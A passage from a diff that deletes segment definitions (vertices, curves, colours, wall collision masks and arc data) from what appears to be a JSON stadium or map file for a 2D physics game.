-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 1.0000000000000002
-        },
-        {
-            "v0": 92,
-            "v1": 93,
-            "curve": 89.99999999999999,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 1.0000000000000002
-        },
-        {
-            "v0": 95,
-            "v1": 94,
-            "curve": 89.99999999999999,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 1.0000000000000002
-        },
-        {
-            "v0": 96,
-            "v1": 97,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": []
-        },
-        {
-            "v0": 99,
-            "v1": 98,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 98,
-            "v1": 99,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 101,
-            "v1": 100,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 100,
-            "v1": 101,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 103,
-            "v1": 102,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 102,
-            "v1": 103,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 105,
-            "v1": 104,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 104,
-            "v1": 105,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 107,
-            "v1": 106,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 106,
-            "v1": 107,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 109,
-            "v1": 108,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 108,
-            "v1": 109,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 111,
-            "v1": 110,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 110,
-            "v1": 111,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 113,
-            "v1": 112,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 112,
-            "v1": 113,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 115,
-            "v1": 114,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 114,
-            "v1": 115,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 117,
-            "v1": 116,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 116,
-            "v1": 117,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 119,
-            "v1": 118,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 118,
-            "v1": 119,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 121,
-            "v1": 120,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 120,
-            "v1": 121,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 123,
-            "v1": 122,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 122,
-            "v1": 123,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 125,
-            "v1": 124,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 124,
-            "v1": 125,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 127,
-            "v1": 126,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 126,
-            "v1": 127,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 129,
-            "v1": 128,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 128,
-            "v1": 129,
-            "curve": 180,
-            "color": "F8F8F8",
-            "bCoef": 0.1,
-            "cMask": [],
-            "curveF": 6.123233995736766e-17
-        },
-        {
-            "v0": 134,
-            "v1": 135,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        8.696301939869894,
-                        -21.088905819609685
-                    ],
-                    "b": [
-                        26.088905819609685,
-                        -18.91483033464221
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 135,
-            "v1": 136,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        26.088905819609685,
-                        -18.91483033464221
-                    ],
-                    "b": [
-                        0,
-                        31.088905819609685
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 136,
-            "v1": 137,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        0,
-                        31.088905819609685
-                    ],
-                    "b": [
-                        -26.088905819609685,
-                        -18.91483033464221
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 137,
-            "v1": 138,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -26.088905819609685,
-                        -18.91483033464221
-                    ],
-                    "b": [
-                        -8.696301939869894,
-                        -21.088905819609685
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 140,
-            "v1": 141,
-            "curve": 100,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.83909963117728,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -44.833333333333336,
-                        -33.666666666666664
-                    ],
-                    "b": [
-                        44.833333333333336,
-                        -33.666666666666664
-                    ],
-                    "curve": 100,
-                    "radius": 58.52576013839715,
-                    "center": [
-                        0,
-                        3.952966797781393
-                    ],
-                    "from": -2.443460952792061,
-                    "to": -0.6981317007977319
-                }
-            }
-        },
-        {
-            "v0": 142,
-            "v1": 143,
-            "curve": 105.00000000000001,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.7673269879789604,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        55.00000000000001,
-                        -17.666666666666668
-                    ],
-                    "b": [
-                        7.333333333333332,
-                        63.33333333333332
-                    ],
-                    "curve": 105.00000000000001,
-                    "radius": 59.232518186056765,
-                    "center": [
-                        0.08992365351880238,
-                        4.545373453168111
-                    ],
-                    "from": -0.38439396626745315,
-                    "to": 1.4482017483265937
-                }
-            }
-        },
-        {
-            "v0": 144,
-            "v1": 145,
-            "curve": 105.00000000000001,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.7673269879789604,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -8,
-                        63.33333333333333
-                    ],
-                    "b": [
-                        -55,
-                        -19
-                    ],
-                    "curve": 105.00000000000001,
-                    "radius": 59.748844769686876,
-                    "center": [
-                        0.08829433846717549,
-                        4.1344824491611085
-                    ],
-                    "from": 1.7065847919182935,
-                    "to": -2.744004800667246
-                }
-            }
-        },
-        {
-            "v0": 146,
-            "v1": 147,
-            "curve": 89.99999999999999,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 1.0000000000000002,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        48.5,
-                        -7.5
-                    ],
-                    "b": [
-                        16,
-                        51.5
-                    ],
-                    "curve": 89.99999999999999,
-                    "radius": 47.630085030367106,
-                    "center": [
-                        2.749999999999986,
-                        5.749999999999993
-                    ],
-                    "from": -0.28190454605723575,
-                    "to": 1.2888917807376603
-                }
-            }
-        },
-        {
-            "v0": 148,
-            "v1": 149,
-            "curve": 89.99999999999999,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 1.0000000000000002,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -15.333333333333332,
-                        52.833333333333336
-                    ],
-                    "b": [
-                        -48.833333333333336,
-                        -8.833333333333334
-                    ],
-                    "curve": 89.99999999999999,
-                    "radius": 49.62372304542344,
-                    "center": [
-                        -1.2499999999999787,
-                        5.249999999999993
-                    ],
-                    "from": 1.858553604613498,
-                    "to": -2.8538353757711925
-                }
-            }
-        },
-        {
-            "v0": 150,
-            "v1": 151,
-            "curve": 89.99999999999999,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 1.0000000000000002,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -34,
-                        -31
-                    ],
-                    "b": [
-                        34,
-                        -31
-                    ],
-                    "curve": 89.99999999999999,
-                    "radius": 48.083261120685236,
-                    "center": [
-                        0,
-                        3.000000000000007
-                    ],
-                    "from": -2.356194490192345,
-                    "to": -0.7853981633974484
-                }
-            }
-        },
-        {
-            "v0": 153,
-            "v1": 154,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -2,
-                        55.807434214382
-                    ],
-                    "b": [
-                        43.32891343843404,
-                        -24.26298130457716
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 155,
-            "v1": 156,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -0.5,
-                        58.807434214382
-                    ],
-                    "b": [
-                        46.32891343843404,
-                        -26.26298130457716
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 158,
-            "v1": 157,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -39.82891343843404,
-                        -22.76298130457716
-                    ],
-                    "b": [
-                        0.5,
-                        50.807434214382
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 160,
-            "v1": 159,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -45.82891343843404,
-                        -25.76298130457716
-                    ],
-                    "b": [
-                        -3,
-                        51.807434214382
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 162,
-            "v1": 161,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -42.82891343843404,
-                        -24.26298130457716
-                    ],
-                    "b": [
-                        -1,
-                        51.307434214382
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 163,
-            "v1": 164,
-            "curve": 95,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.9163311740174233,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -13.5,
-                        55.5
-                    ],
-                    "b": [
-                        -51.33333333333333,
-                        -9.666666666666668
-                    ],
-                    "curve": 95,
-                    "radius": 51.1021225052189,
-                    "center": [
-                        -2.5595425799322875,
-                        5.582735291503745
-                    ],
-                    "from": 1.7865565416294638,
-                    "to": -2.8385659761555098
-                }
-            }
-        },
-        {
-            "v0": 165,
-            "v1": 166,
-            "curve": 95,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.9163311740174233,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        50.247622344939806,
-                        -10.827077859628849
-                    ],
-                    "b": [
-                        13.776591618795642,
-                        54.720743559719
-                    ],
-                    "curve": 95,
-                    "radius": 50.87028671513736,
-                    "center": [
-                        1.9803509041300238,
-                        5.2370616485884725
-                    ],
-                    "from": -0.32128524207310144,
-                    "to": 1.336777547321512
-                }
-            }
-        },
-        {
-            "v0": 167,
-            "v1": 168,
-            "curve": 95,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.9163311740174233,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -36.5,
-                        -32
-                    ],
-                    "b": [
-                        36,
-                        -32.5
-                    ],
-                    "curve": 95,
-                    "radius": 49.1685560491481,
-                    "center": [
-                        -0.020917206495644214,
-                        0.9670050581315905
-                    ],
-                    "from": -2.406724163880552,
-                    "to": -0.7486613744859384
-                }
-            }
-        },
-        {
-            "v0": 169,
-            "v1": 170,
-            "curve": 100,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.83909963117728,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -38.5,
-                        -33
-                    ],
-                    "b": [
-                        37.5,
-                        -33
-                    ],
-                    "curve": 100,
-                    "radius": 49.60547699462658,
-                    "center": [
-                        -0.5,
-                        -1.114214015263368
-                    ],
-                    "from": -2.4434609527920617,
-                    "to": -0.6981317007977317
-                }
-            }
-        },
-        {
-            "v0": 171,
-            "v1": 172,
-            "curve": 100,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.83909963117728,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        51.247622344939806,
-                        -12.32707785962885
-                    ],
-                    "b": [
-                        12.776591618795642,
-                        57.220743559719
-                    ],
-                    "curve": 100,
-                    "radius": 51.876266760991406,
-                    "center": [
-                        2.83333133078866,
-                        6.306319003386388
-                    ],
-                    "from": -0.36739901342171793,
-                    "to": 1.3779302385726115
-                }
-            }
-        },
-        {
-            "v0": 173,
-            "v1": 174,
-            "curve": 100,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.83909963117728,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -13.57545642913032,
-                        57.366529442994405
-                    ],
-                    "b": [
-                        -53.68806080584215,
-                        -15.91557543219485
-                    ],
-                    "curve": 100,
-                    "radius": 54.52825445254999,
-                    "center": [
-                        -2.8862650311532043,
-                        3.8962412363702583
-                    ],
-                    "from": 1.7681043770730156,
-                    "to": -2.7697516781122413
-                }
-            }
-        },
-        {
-            "v0": 175,
-            "v1": 176,
-            "curve": 100,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.83909963117728,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        53,
-                        -15.5
-                    ],
-                    "b": [
-                        9.166666666666666,
-                        61.166666666666664
-                    ],
-                    "curve": 100,
-                    "radius": 57.642042991315776,
-                    "center": [
-                        -1.082152528462391,
-                        4.443066416697945
-                    ],
-                    "from": -0.35328442935791365,
-                    "to": 1.3920448226364162
-                }
-            }
-        },
-        {
-            "v0": 177,
-            "v1": 178,
-            "curve": 100,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.83909963117728,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -10.208639538227883,
-                        60.90200066883591
-                    ],
-                    "b": [
-                        -52.47917902425498,
-                        -13.66643428564214
-                    ],
-                    "curve": 100,
-                    "radius": 55.94721164104653,
-                    "center": [
-                        -0.058736147356665214,
-                        5.88318614540189
-                    ],
-                    "from": 1.7532258254011652,
-                    "to": -2.784630229784092
-                }
-            }
-        },
-        {
-            "v0": 179,
-            "v1": 180,
-            "curve": 95,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "curveF": 0.9163311740174233,
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -40.5,
-                        -34.5
-                    ],
-                    "b": [
-                        40.5,
-                        -34
-                    ],
-                    "curve": 95,
-                    "radius": 54.93288559881305,
-                    "center": [
-                        -0.22908279350435587,
-                        2.8614125477056476
-                    ],
-                    "from": -2.393654960387422,
-                    "to": -0.7355921709928092
-                }
-            }
-        },
-        {
-            "v0": 181,
-            "v1": 182,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        8.696301939869894,
-                        -21.088905819609685
-                    ],
-                    "b": [
-                        68.0918947430112,
-                        -42.82966066928442
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 182,
-            "v1": 183,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "v0": 184,
-            "v1": 185,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -8.696301939869894,
-                        -21.088905819609685
-                    ],
-                    "b": [
-                        -68.70078532497217,
-                        -42.82966066928442
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 185,
-            "v1": 186,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "v0": 189,
-            "v1": 190,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -50.0906991736506,
-                        -27.61113227451211
-                    ],
-                    "b": [
-                        -37.82891343843404,
-                        -23.26298130457716
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 193,
-            "v1": 194,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        0,
-                        61.52596260915432
-                    ],
-                    "b": [
-                        -50.0906991736506,
-                        -27.61113227451211
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 195,
-            "v1": 192,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -37.82891343843404,
-                        -23.26298130457716
-                    ],
-                    "b": [
-                        0,
-                        46.307434214382
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 196,
-            "v1": 197,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -0.8333333333333335,
-                        51.807434214382
-                    ],
-                    "b": [
-                        39.9955801051007,
-                        -22.262981304577156
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 199,
-            "v1": 200,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        37.82891343843404,
-                        -23.26298130457716
-                    ],
-                    "b": [
-                        50.0037361542519,
-                        -27.61113227451211
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 202,
-            "v1": 204,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        50.0037361542519,
-                        -27.61113227451211
-                    ],
-                    "b": [
-                        0,
-                        61.52596260915432
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 205,
-            "v1": 203,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        0,
-                        46.307434214382
-                    ],
-                    "b": [
-                        37.82891343843404,
-                        -23.26298130457716
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 206,
-            "v1": 207,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "v0": 208,
-            "v1": 209,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "v0": 210,
-            "v1": 211,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        59.0918947430112,
-                        -39.496327335951094
-                    ],
-                    "b": [
-                        -4.333333333333333,
-                        72.02004825255426
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 212,
-            "v1": 213,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ]
-        },
-        {
-            "v0": 214,
-            "v1": 215,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -61.70078532497219,
-                        -39.829660669284415
-                    ],
-                    "b": [
-                        3.666666666666667,
-                        74.25189982222744
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 216,
-            "v1": 217,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -58.70078532497219,
-                        -38.49632733595109
-                    ],
-                    "b": [
-                        4.666666666666666,
-                        72.58523315556077
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 218,
-            "v1": 219,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        26.088905819609685,
-                        -18.91483033464221
-                    ],
-                    "b": [
-                        0,
-                        31.088905819609685
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 220,
-            "v1": 221,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        33.75557248627636,
-                        -27.581497001308875
-                    ],
-                    "b": [
-                        -2.666666666666667,
-                        39.75557248627636
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 222,
-            "v1": 223,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        35.75557248627634,
-                        -28.248163667975554
-                    ],
-                    "b": [
-                        -1.3333333333333337,
-                        41.75557248627635
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 224,
-            "v1": 225,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        37.08890581960969,
-                        -26.581497001308886
-                    ],
-                    "b": [
-                        -2.220446049250313e-16,
-                        44.75557248627635
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 226,
-            "v1": 227,
-            "color": "6B5491",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -0.3333333333333286,
-                        54.666666666666664
-                    ],
-                    "b": [
-                        -8.333333333333343,
-                        41.333333333333336
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 228,
-            "v1": 229,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        0,
-                        35.088905819609685
-                    ],
-                    "b": [
-                        -34.75557248627635,
-                        -29.248163667975547
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 230,
-            "v1": 231,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -1.3333333333333335,
-                        38.42223915294302
-                    ],
-                    "b": [
-                        -38.088905819609685,
-                        -31.248163667975547
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 232,
-            "v1": 233,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -6,
-                        32.75557248627635
-                    ],
-                    "b": [
-                        -40.42223915294303,
-                        -32.91483033464221
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 234,
-            "v1": 235,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -15.029635273203224,
-                        -20.75557248627635
-                    ],
-                    "b": [
-                        -66.36745199163884,
-                        -39.82966066928442
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 236,
-            "v1": 237,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -20.362968606536562,
-                        -19.42223915294302
-                    ],
-                    "b": [
-                        -64.36745199163884,
-                        -36.82966066928442
-                    ],
-                    "radius": null,
-                    "center": [
-                        null,
-                        null
-                    ],
-                    "from": null,
-                    "to": null
-                }
-            }
-        },
-        {
-            "v0": 238,
-            "v1": 239,
-            "color": "1F1536",
-            "cMask": [
-                "wall"
-            ],
-            "_data": {
-                "mirror": {},
-                "arc": {
-                    "a": [
-                        -25.029635273203226,
-                        -18.42223915294302
-                    ],
-                    "b": [
